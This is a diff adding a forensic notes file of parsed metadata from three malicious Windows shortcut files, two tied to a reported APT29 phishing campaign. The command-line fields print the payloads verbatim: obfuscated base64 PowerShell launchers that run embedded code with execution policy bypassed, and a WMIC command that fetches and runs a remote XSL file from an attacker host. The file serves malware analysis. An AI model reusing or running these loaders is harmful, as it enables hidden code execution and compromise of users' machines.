@@ -1,0 +1,117 @@
+This file contains the metadata of several LNK files available online.
+
+The two "cozy" LNK files were retrieved as a result of this FireEye blog post:
+https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html
+
+LNK #1:
+file: d:\cases\cozy\cozy\coz
+
+guid               {00021401-0000-0000-c000-000000000046}
+mtime              Tue Jul 14 01:14:24 2009 Z
+atime              Mon Jul 13 23:32:37 2009 Z
+ctime              Mon Jul 13 23:32:37 2009 Z
+basepath           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+description        ds7002.pdf
+shitemidlist       My Computer/C:\/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+**Shell Items Details (times in UTC)**
+  C:2009-07-14 02:37:06  M:2016-02-16 18:50:36  A:2016-02-16 18:50:36 Windows (8)
+  C:2009-07-14 02:37:08  M:2018-11-02 10:25:58  A:2018-11-02 10:25:58 System32 (8)
+  C:2009-07-14 04:52:32  M:2009-07-14 04:52:32  A:2009-07-14 04:52:32 WindowsPowerShell (8)
+  C:2009-07-14 04:52:32  M:2016-02-16 18:50:44  A:2016-02-16 18:50:44 v1.0 (8)
+  C:2009-07-13 23:32:38  M:2009-07-14 01:14:26  A:2009-07-13 23:32:38 powershell.exe (8)
+vol_sn             C4B2-BD1C
+vol_type           Fixed Disk
+commandline        -noni -ep bypass $zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJEVudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUpO30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2enZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZCgkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFycmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.Encoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia;
+iconfilename       C:\windows\system32\shell32.dll
+hotkey             0x0
+showcmd            0x7
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasExpIcon|HasLinkInfo|HasArguments|HasName|HasIconLocation|HasRelativePath
+
+***PropertyStoreDataBlock***
+SID: S-1-5-21-1764276529-1526541935-4264456457-1000
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+***TrackerDataBlock***
+Machine ID            : user-pc
+New Droid ID Time     : Thu Oct  6 17:03:04 2016 UTC
+New Droid ID Seq Num  : 13273
+New Droid    Node ID  : 08:00:27:92:24:e5
+Birth Droid ID Time   : Thu Oct  6 17:03:04 2016 UTC
+Birth Droid ID Seq Num: 13273
+Birth Droid Node ID   : 08:00:27:92:24:e5
+
+
+LNK #2
+file: d:\cases\cozy2\cozy2
+
+guid               {00021401-0000-0000-c000-000000000046}
+mtime              Tue Jul 14 01:14:24 2009 Z
+atime              Mon Jul 13 23:32:37 2009 Z
+ctime              Mon Jul 13 23:32:37 2009 Z
+basepath           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+shitemidlist       My Computer/C:\/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+**Shell Items Details (times in UTC)**
+  C:2009-07-14 02:37:06  M:2016-02-16 18:50:36  A:2016-02-16 18:50:36 Windows (8)
+  C:2009-07-14 02:37:08  M:2016-11-08 22:00:34  A:2016-11-08 22:00:34 System32 (8)
+  C:2009-07-14 04:52:32  M:2009-07-14 04:52:32  A:2009-07-14 04:52:32 WindowsPowerShell (8)
+  C:2009-07-14 04:52:32  M:2016-02-16 18:50:44  A:2016-02-16 18:50:44 v1.0 (8)
+  C:2009-07-13 23:32:38  M:2009-07-14 01:14:26  A:2009-07-13 23:32:38 powershell.exe (8)
+vol_sn             C4B2-BD1C
+vol_type           Fixed Disk
+commandline        -noni -ep bypass -win hidden $s = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JG9zPTB4MDAwOWZkZGE7JG9lPTB4MDAwYTE5MTY7JGY9IjM3NDg2LXRoZS1zaG9ja2luZy10cnV0aC1hYm91dC1lbGVjdGlvbi1yaWdnaW5nLWluLWFtZXJpY2EucnRmLmxuayI7aWYgKC1ub3QoVGVzdC1QYXRoICRmKSl7JHggPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRFbnY6dGVtcCAtRmlsdGVyICRmIC1SZWN1cnNlO1tJTy5EaXJlY3RvcnldOjpTZXRDdXJyZW50RGlyZWN0b3J5KCR4LkRpcmVjdG9yeU5hbWUpO30kaWZkID0gTmV3LU9iamVjdCBJTy5GaWxlU3RyZWFtICRmLCdPcGVuJywnUmVhZCcsJ1JlYWRXcml0ZSc7JHggPSBOZXctT2JqZWN0IGJ5dGVbXSgkb2UtJG9zKTskaWZkLlNlZWsoJG9zLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRpZmQuUmVhZCgkeCwwLCRvZS0kb3MpOyR4PVtDb252ZXJ0XTo6RnJvbUJhc2U2NENoYXJBcnJheSgkeCwwLCR4Lkxlbmd0aCk7JHM9W1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHgpO2lleCAkczs='));iex $s;
+iconfilename       C:\Windows\System32\shell32.dll
+hotkey             0x0
+showcmd            0x7
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasExpIcon|HasLinkInfo|HasArguments|HasIconLocation|HasRelativePath
+
+***PropertyStoreDataBlock***
+SID: S-1-5-21-1764276529-1526541935-4264456457-1000
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+***TrackerDataBlock***
+Machine ID            : user-pc
+New Droid ID Time     : Thu Oct  6 17:03:04 2016 UTC
+New Droid ID Seq Num  : 13273
+New Droid    Node ID  : 08:00:27:92:24:e5
+Birth Droid ID Time   : Thu Oct  6 17:03:04 2016 UTC
+Birth Droid ID Seq Num: 13273
+Birth Droid Node ID   : 08:00:27:92:24:e5
+
+
+https://twitter.com/DissectMalware/status/1043407573821677568
+https://www.hybrid-analysis.com/sample/695e03c97eaed0303c9527e579e69b1ba280c448476edcf97d7a289b439fa39a?environmentId=100
+MD5: 0b12bdcfa497422aedf092729325ff6d
+
+guid               {00021401-0000-0000-c000-000000000046}
+description        44OFxmd8rhESizmd7i26IOKcvjd7gt6IFqcv
+shitemidlist       My Computer/C:\/WINDOWS/system32/cmd.exe
+  C:0                   M:0                   A:0                  Z WINDOWS (9)
+  C:0                   M:0                   A:0                  Z system32 (9)
+  C:0                   M:0                   A:0                  Z cmd.exe (9)
+commandline        /k start /MIN %SystemRoot%\\system32\\wbem\\WMIC.exe os get /format:"http://t9UHncbrj.iceyavod.com:25073/03/vv.xsl?13102507390dOIrmxm" && exit
+iconfilename       %SystemRoot%\system32\imageres.dll
+hotkey             0x0
+showcmd            0x7
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasArguments|HasName|HasIconLocation
+
+***PropertyStoreDataBlock***
+SID: S-1-5-21-1051504378-1802116228-1550938009-1001
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+Notes: No TrackerDataBlock, confirmed that time stamps in shell items are zero'd
+out.
